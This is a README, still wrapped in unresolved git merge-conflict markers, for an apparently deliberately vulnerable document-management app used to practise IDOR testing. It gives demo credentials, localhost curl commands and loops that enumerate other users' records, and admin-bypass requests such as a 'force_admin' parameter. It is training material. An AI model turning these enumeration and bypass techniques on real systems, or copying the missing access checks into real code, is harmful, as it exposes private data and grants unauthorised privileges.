<<<<<<< HEAD
# DocManager Pro - IDOR Testing Environment

A comprehensive web application designed for testing **Insecure Direct Object Reference (IDOR)** vulnerabilities using modern RESTful URL patterns. This environment simulates a corporate document management system with intentional security flaws for educational and testing purposes.

## 🚀 Quick Start

### Prerequisites
- Docker and Docker Compose
- Web browser
- Optional: curl, Burp Suite, or other security testing tools

### Setup
1. **Clone and Start**
   ```bash
   cd idor-testing-env
   docker-compose up -d
   ```

2. **Access the Application**
   - URL: `http://localhost:8083`
   - The application will be ready once both containers are running

3. **Login with Demo Accounts**
   | Username | Password | Role | Department |
   |----------|----------|------|------------|
   | john.doe | password123 | admin | IT |
   | jane.smith | password123 | manager | HR |
   | bob.wilson | password123 | employee | Finance |
   | alice.brown | password123 | employee | Marketing |
   | charlie.davis | password123 | employee | Operations |

## 🎯 IDOR Testing Guide

### Understanding the Vulnerabilities

This environment uses **path-based RESTful URLs** instead of traditional query parameters, making IDOR testing more realistic and representative of modern web applications.

**Traditional IDOR:** `GET /view_document.php?id=1`
**Path-based IDOR:** `GET /documents/1/view`

### 1. Direct Resource Access Testing

#### Document IDOR Testing
```bash
# Test accessing different documents
curl http://localhost:8083/documents/1/view
curl http://localhost:8083/documents/2/view
curl http://localhost:8083/documents/999/view

# Download documents you shouldn't have access to
curl http://localhost:8083/documents/1/download
curl http://localhost:8083/documents/5/download

# Try editing documents
curl http://localhost:8083/documents/3/edit
```

#### Order IDOR Testing
```bash
# View other users' orders and financial information
curl http://localhost:8083/orders/1/view
curl http://localhost:8083/orders/2/view
curl http://localhost:8083/orders/10/view

# Download invoices for orders you don't own
curl http://localhost:8083/orders/1/invoice
curl http://localhost:8083/orders/5/invoice
```

#### Profile IDOR Testing
```bash
# Access other users' personal information
curl http://localhost:8083/profiles/1/view
curl http://localhost:8083/profiles/2/view
curl http://localhost:8083/profiles/5/view

# Attempt to edit other users' profiles
curl http://localhost:8083/profiles/2/edit
```

#### Message IDOR Testing
```bash
# Read other users' private messages
curl http://localhost:8083/messages/1/view
curl http://localhost:8083/messages/5/view
curl http://localhost:8083/messages/10/view

# Try to delete messages you don't own
curl -X POST http://localhost:8083/messages/3/delete
```

#### Report IDOR Testing
```bash
# Access confidential reports
curl http://localhost:8083/reports/1/view
curl http://localhost:8083/reports/3/view
curl http://localhost:8083/reports/7/view

# Download confidential report files
curl http://localhost:8083/reports/2/download
curl http://localhost:8083/reports/4/download
```

### 2. Collection-based IDOR Testing

#### User Data Enumeration
```bash
# View documents owned by specific users
curl http://localhost:8083/documents/user/1
curl http://localhost:8083/documents/user/2
curl http://localhost:8083/documents/user/5

# View orders belonging to other users
curl http://localhost:8083/orders/user/1
curl http://localhost:8083/orders/user/3

# View messages for specific users
curl http://localhost:8083/messages/user/1
curl http://localhost:8083/messages/user/4

# View reports by specific authors
curl http://localhost:8083/reports/author/1
curl http://localhost:8083/reports/author/2
```

### 3. API Endpoint IDOR Testing

#### RESTful API Vulnerabilities
```bash
# Get user profile data
curl http://localhost:8083/api/users/1
curl http://localhost:8083/api/users/2
curl http://localhost:8083/api/users/5

# Get user-specific documents
curl http://localhost:8083/api/users/1/documents
curl http://localhost:8083/api/users/3/documents

# Get user order history
curl http://localhost:8083/api/users/1/orders
curl http://localhost:8083/api/users/4/orders

# Get user messages
curl http://localhost:8083/api/users/2/messages
curl http://localhost:8083/api/users/5/messages

# Get complete user data dump
curl http://localhost:8083/api/users/1/data
curl http://localhost:8083/api/users/3/data
```

### 4. Admin Function IDOR Testing

#### Privilege Escalation via Path Manipulation
```bash
# Try to access admin functions without proper authorization
curl http://localhost:8083/admin/users/1/view-data
curl http://localhost:8083/admin/users/2/reset-password
curl http://localhost:8083/admin/users/3/make-admin
curl http://localhost:8083/admin/users/4/delete

# Test admin bypass parameter
curl "http://localhost:8083/admin.php?force_admin=1"
```

## 🔍 Testing Scenarios

### Scenario 1: Employee Data Access
**Goal:** As `bob.wilson` (employee), access other employees' sensitive data

1. Login as `bob.wilson`
2. Try accessing: `http://localhost:8083/profiles/1/view` (admin's profile)
3. Try accessing: `http://localhost:8083/profiles/2/view` (manager's profile)
4. **Expected:** Should see salary, emergency contacts, and other sensitive data

### Scenario 2: Financial Data Exposure
**Goal:** Access financial information you shouldn't see

1. Login as any user
2. Try accessing: `http://localhost:8083/orders/user/1` (admin's orders)
3. Try accessing: `http://localhost:8083/api/users/2/orders` (manager's orders)
4. **Expected:** Should see order amounts, purchase history, financial data

### Scenario 3: Document Confidentiality Bypass
**Goal:** Access confidential documents from other departments

1. Login as Marketing employee (`alice.brown`)
2. Try accessing: `http://localhost:8083/documents/user/1` (IT department docs)
3. Try accessing: `http://localhost:8083/reports/author/1` (admin reports)
4. **Expected:** Should see confidential IT documents and admin reports

### Scenario 4: Message Privacy Violation
**Goal:** Read private communications between users

1. Login as any user
2. Try accessing: `http://localhost:8083/messages/user/1` (admin messages)
3. Try accessing: `http://localhost:8083/api/users/2/messages` (manager messages)
4. **Expected:** Should see private communications between other users

### Scenario 5: Admin Privilege Bypass
**Goal:** Perform admin actions without admin privileges

1. Login as regular employee
2. Try accessing: `http://localhost:8083/admin/users/2/reset-password`
3. Try accessing: `http://localhost:8083/admin.php?force_admin=1`
4. **Expected:** Should be able to perform admin actions

## 🛠 Testing Tools

### Manual Testing
- **Browser:** Use browser dev tools to modify URLs
- **URL Manipulation:** Change path segments to test different IDs
- **Parameter Testing:** Test `?force_admin=1` and similar bypasses

### Automated Testing
```bash
# Test document access for multiple IDs
for i in {1..20}; do
  curl -s -o /dev/null -w "%{http_code}" http://localhost:8083/documents/$i/view
  echo " - Document $i"
done

# Test user profile enumeration
for i in {1..10}; do
  curl -s http://localhost:8083/api/users/$i | jq '.first_name, .last_name, .email'
done

# Test order access across users
for i in {1..5}; do
  echo "User $i orders:"
  curl -s http://localhost:8083/orders/user/$i | grep -o 'Order #[0-9]*'
done
```

### Burp Suite Testing
1. **Intercept requests** to the application
2. **Modify path segments** in intercepted requests
3. **Use Intruder** to enumerate IDs in paths like `/documents/§1§/view`
4. **Check responses** for sensitive data exposure

## 🚨 What to Look For

### Successful IDOR Exploitation
- **Unauthorized Data Access:** Seeing other users' data
- **Sensitive Information:** Salaries, emergency contacts, personal details
- **Financial Data:** Order amounts, payment information
- **Private Communications:** Messages between other users
- **Confidential Documents:** Reports marked as confidential
- **Admin Functions:** Ability to perform admin actions

### Expected Vulnerability Behaviors
- ✅ **Documents:** View any document by changing ID in path
- ✅ **Orders:** Access any user's order history and financial data
- ✅ **Profiles:** View sensitive personal information of other users
- ✅ **Messages:** Read private communications between users
- ✅ **Reports:** Access confidential reports from other departments
- ✅ **API:** Get complete user data dumps via API endpoints
- ✅ **Admin:** Perform admin actions via URL manipulation

### Security Notices
The application will sometimes show security notices when you access unauthorized data, but the data is still exposed - this represents the vulnerability.

## 📊 IDOR Vulnerability Matrix

| Resource | Individual Access | Collection Access | API Access | Admin Access |
|----------|------------------|-------------------|------------|--------------|
| Documents | `/documents/{id}/view` | `/documents/user/{id}` | `/api/users/{id}/documents` | ❌ |
| Orders | `/orders/{id}/view` | `/orders/user/{id}` | `/api/users/{id}/orders` | ❌ |
| Profiles | `/profiles/{id}/view` | ❌ | `/api/users/{id}` | `/admin/users/{id}/view-data` |
| Messages | `/messages/{id}/view` | `/messages/user/{id}` | `/api/users/{id}/messages` | ❌ |
| Reports | `/reports/{id}/view` | `/reports/author/{id}` | ❌ | ❌ |
| User Data | ❌ | ❌ | `/api/users/{id}/data` | `/admin/users/{id}/*` |

## 🔧 Cleanup

```bash
# Stop the environment
docker-compose down

# Remove volumes (clears database)
docker-compose down -v

# Remove images
docker-compose down --rmi all
```

## ⚠️ Important Notes

- **Educational Purpose Only:** This environment contains intentional vulnerabilities
- **Not for Production:** Never deploy this in a production environment
- **Path-based IDORs:** More realistic than parameter-based testing
- **RESTful URLs:** Represents modern web application architecture
- **Complete Coverage:** Tests multiple IDOR vulnerability types

## 🎓 Learning Objectives

After testing this environment, you should understand:

1. **Path-based IDOR vulnerabilities** in RESTful APIs
2. **Direct object reference** manipulation techniques
3. **API endpoint enumeration** for data exposure
4. **Privilege escalation** via URL manipulation
5. **Collection-based access control** bypasses
6. **Modern web application** security testing approaches

---

**Happy Testing! 🔍🛡️**

For questions or issues, check the application logs:
```bash
docker-compose logs -f
``` 
=======
# idor-testing-env
>>>>>>> f69d9ed2ac88b4b50ba0ceb80935e878fe0ec32e
